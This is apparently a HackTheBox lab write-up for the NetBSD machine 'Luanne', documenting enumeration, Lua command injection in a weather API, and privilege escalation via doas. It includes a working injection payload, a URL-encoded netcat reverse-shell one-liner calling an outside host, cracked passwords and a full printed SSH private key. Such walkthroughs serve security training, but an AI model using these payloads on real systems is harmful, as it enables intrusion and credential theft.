---
title: "[HTB] Machine: Luanne"
description: "[HTB] Machine: Luanne"
date: 2023-07-09
menu:
  sidebar:
    name: "[HTB] Machine: Luanne"
    identifier: htb-machine-luanne
    parent: htb-machines-linux
    weight: 10
hero: images/luanne.png
tags: ["HTB", "netbsd", "supervisor-process-manager", "ffuf", "lua", "command-injection", "doas", "pgp", "netpgp"]
---

# Luanne
## Enumeration
- ```Nmap```
```
└─$ nmap -sC -sV -Pn 10.10.10.218 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 17:33 BST
Nmap scan report for 10.10.10.218 (10.10.10.218)
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA)
|   521 35c329e187706d7374b2a9a204a96669 (ECDSA)
|_  256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
|_http-title: Error response
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.16 seconds
```
- Web server

![](./images/1.png)

![](./images/3.png)


## Foothold
- If we visit port `9001`, we have login page but it shows nothing else
  - `nmap` tells us some information about `Supervisor process manager` and `realm`
  - Googling reveals the [configuration](http://supervisord.org/configuration.html)
  - The creds work `user:123`

![](./images/2.png)

![](./images/4.png)

![](./images/5.png)

- We see an interesting process
  - `/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www`
  - `-L weather /usr/local/webapi/weather.lua` - Adds `/usr/local/webapi/weather.lua` Lua script for the prefix `weather` ([man page](https://man.netbsd.org/NetBSD-9.3/httpd.8))
    - `... will trigger the execution of the Lua script when a URL in the form http://10.10.10.218/weather/<name> is being accessed`


- Let's check port `80`
  - We see port 

```
└─$ curl -v http://10.10.10.218
*   Trying 10.10.10.218:80...
* Connected to 10.10.10.218 (10.10.10.218) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.218
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Server: nginx/1.19.0
< Date: Thu, 20 Jul 2023 18:05:49 GMT
< Content-Type: text/html
< Content-Length: 209
< Connection: keep-alive
< WWW-Authenticate: Basic realm="."
< 
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
/index.html: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3000/">127.0.0.1:3000</a></address>
</body></html>
* Connection #0 to host 10.10.10.218 left intact
```

- Let's `gobuster` `weather` directory
```
└─$ gobuster dir -u http://10.10.10.218/weather -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50       
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.218/weather
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/20 19:11:39 Starting gobuster in directory enumeration mode
===============================================================
/forecast             (Status: 200) [Size: 90]
```

- Visit the page

![](./images/6.png)

![](./images/7.png)

- The result of visiting `?city=London`
```
└─$ curl -s http://10.10.10.218/weather/forecast?city=London | jq
{
  "code": 200,
  "city": "London",
  "list": [
    {
      "date": "2023-07-20",
      "weather": {
        "description": "snowy",
        "temperature": {
          "min": "12",
          "max": "46"
        },
        "pressure": "1799",
        "humidity": "92",
        "wind": {
          "speed": "2.1975513692014",
          "degree": "102.76822959445"
        }
      }
    },
    {
      "date": "2023-07-21",
      "weather": {
        "description": "partially cloudy",
        "temperature": {
          "min": "15",
          "max": "43"
        },
        "pressure": "1365",
        "humidity": "51",
        "wind": {
          "speed": "4.9522297247313",
          "degree": "262.63571172766"
        }
      }
    },
    {
      "date": "2023-07-22",
      "weather": {
        "description": "sunny",
        "temperature": {
          "min": "19",
          "max": "30"
        },
        "pressure": "1243",
        "humidity": "13",
        "wind": {
          "speed": "1.8041767538525",
          "degree": "48.400944394059"
        }
      }
    },
    {
      "date": "2023-07-23",
      "weather": {
        "description": "sunny",
        "temperature": {
          "min": "30",
          "max": "34"
        },
        "pressure": "1513",
        "humidity": "84",
        "wind": {
          "speed": "2.6126398323104",
          "degree": "191.63755226741"
        }
      }
    },
    {
      "date": "2023-07-24",
      "weather": {
        "description": "partially cloudy",
        "temperature": {
          "min": "30",
          "max": "36"
        },
        "pressure": "1772",
        "humidity": "53",
        "wind": {
          "speed": "2.7699138359167",
          "degree": "104.89152945159"
        }
      }
    }
  ]
}

```

- If we visit the city that is not in the list, we get an error

```
└─$ curl -s http://10.10.10.218/weather/forecast?city=Moscow | jq
{
  "code": 500,
  "error": "unknown city: Moscow"
}
```

- There is a [post](https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities) regarding `lua vulnerabilities`
  - If we fuzz for special chars with `ffuf` we find 2 cases there request breaks
  - 

```
└─$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.218/weather/forecast?city=FUZZ -mc 500 -fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.218/weather/forecast?city=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 500
 :: Filter           : Response words: 5
________________________________________________

[Status: 500, Size: 40, Words: 6, Lines: 1, Duration: 183ms]
    * FUZZ: +

[Status: 500, Size: 77, Words: 9, Lines: 2, Duration: 109ms]
    * FUZZ: '

:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

- If we try `'`, we see an error

```
└─$ curl "http://10.10.10.218/weather/forecast?city='"
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```

- If we search fuzz `'` with different combinations of chars, we have nothing 
  - But if we add `--` which specifies the comment block in `lua`, we have the same error
  - So we start fuzzing the following combination `'FUZZ--` to find something

```
└─$ curl "http://10.10.10.218/weather/forecast?city='--"
<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
``` 
```
└─$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u "http://10.10.10.218/weather/forecast?city='FUZZ--" -mc 200,500 -fw 9

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.218/weather/forecast?city='FUZZ--
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,500
 :: Filter           : Response words: 9
________________________________________________

[Status: 500, Size: 37, Words: 5, Lines: 1, Duration: 106ms]
    * FUZZ: )

:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

- And now we have the following output
```
└─$ curl "http://10.10.10.218/weather/forecast?city=')--"
{"code": 500,"error": "unknown city:
```

- Let's try a command injection
  - And it works

```
└─$ curl "http://10.10.10.218/weather/forecast?city=')os.execute('id')--"  
{"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
```

- Let's get reverse shell
  - `curl "http://10.10.10.218/weather/forecast?city=')os.execute('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.12%206666%20%3E%2Ftmp%2Ff')--"`

![](./images/8.png)

## User
- Let's enumerate 
  - We have a `.htpasswd`
  - `hashcat -m 500 hash  /usr/share/wordlists/rockyou.txt`
  - `$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest`
  - But we can do nothing with the password

![](./images/9.png)

![](./images/10.png)

- `/etc/passwd`
  - Another user `r.michaels`

```
root:*:0:0:Charlie &:/root:/bin/sh
toor:*:0:0:Bourne-again Superuser:/root:/bin/sh
daemon:*:1:1:The devil himself:/:/sbin/nologin
operator:*:2:5:System &:/usr/guest/operator:/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin
games:*:7:13:& pseudo-user:/usr/games:/sbin/nologin
postfix:*:12:12:& pseudo-user:/var/spool/postfix:/sbin/nologin
named:*:14:14:& pseudo-user:/var/chroot/named:/sbin/nologin
ntpd:*:15:15:& pseudo-user:/var/chroot/ntpd:/sbin/nologin
sshd:*:16:16:& pseudo-user:/var/chroot/sshd:/sbin/nologin
_pflogd:*:18:18:& pseudo-user:/var/chroot/pflogd:/sbin/nologin
_rwhod:*:19:19:& pseudo-user:/var/rwho:/sbin/nologin
_proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin
_timedc:*:22:22:& pseudo-user:/nonexistent:/sbin/nologin
_sdpd:*:23:23:& pseudo-user:/nonexistent:/sbin/nologin
_httpd:*:24:24:& pseudo-user:/var/www:/sbin/nologin
_mdnsd:*:25:25:& pseudo-user:/nonexistent:/sbin/nologin
_tests:*:26:26:& pseudo-user:/nonexistent:/sbin/nologin
_tcpdump:*:27:27:& pseudo-user:/var/chroot/tcpdump:/sbin/nologin
_tss:*:28:28:& pseudo-user:/var/tpm:/sbin/nologin
_rtadvd:*:30:30:& pseudo-user:/var/chroot/rtadvd:/sbin/nologin
_unbound:*:32:32:& pseudo-user:/var/chroot/unbound:/sbin/nologin
_nsd:*:33:33:& pseudo-user:/var/chroot/nsd:/sbin/nologin
uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin
nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin
r.michaels:*:1000:100::/home/r.michaels:/bin/ksh
nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin
dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin
```

- Processes launched by `r.michaels`
```
$ ps auxw | grep michaels
r.michaels  185  0.0  0.0  36460  1972 ?     Is    4:38PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home
```

- We have identical application with a flags `-u` and `-X` (Enables directory indexing)
  - `Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html`
  - Which means we can access user directory
  - If try it, we have no access

```
$ curl -s http://127.0.0.1:3001/~r.michaels/
<html><head><title>401 Unauthorized</title></head>
<body><h1>401 Unauthorized</h1>
~r.michaels//: <pre>No authorization</pre>
<hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
</body></html>
```

- But if use the creds from `.htpasswd`, they work

```
$ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```

- We see a private key
```
$ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- Now we can connect via `ssh`

[](./images/11.png)

## Root
- `NetBSD` has identical to `sudo` command which `doas`
  - If we check config file, we see that `r.michaels` can run anything as root
  - But we need a password

[](./images/12.png)

- If we check home directory of the user, we have `backups` folder containing archive which is encrypted

[](./images/13.png)

- The directory also contains `.gnupg`,
  - If we try using the keyrings for decryption, they work

[](./images/14.png)

- Let's check the content of the archive
  - There is a `.htpasswd` file with credentials
  - Crack it with `hashcat`
  - `webapi_user:littlebear`

[](./images/15.png)

[](./images/16.png)

- Use the password for `doas` and get a root flag

[](./images/17.png)
